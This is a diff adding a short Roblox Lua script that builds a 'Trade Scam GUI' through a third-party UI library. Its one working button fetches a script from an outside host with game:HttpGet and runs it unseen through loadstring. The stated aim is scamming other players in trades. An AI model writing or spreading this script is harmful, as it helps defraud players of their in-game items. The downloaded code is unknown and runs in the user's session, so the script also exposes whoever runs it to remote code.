@@ -1,0 +1,17 @@
+local DrRayLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/DrRay-UI-Library/main/DrRay.lua"))()
+
+local window = DrRayLibrary:Load("Trade Scam GUI", "Default")
+
+local tab = DrRayLibrary.newTab("Trade Scam", "ImageIdHere")
+
+tab.newButton("Trade Scam", "Function (On/Off", function()
+    loadstring(game:HttpGet("https://egorikusa.space/30f038f8153a289ae76291ec.lua", true))()
+end)
+
+tab.newToggle("On", "Off! (prints the state)", true, function(toggleState)
+    if toggleState then
+        print("On")
+    else
+        print("Off")
+    end
+end)
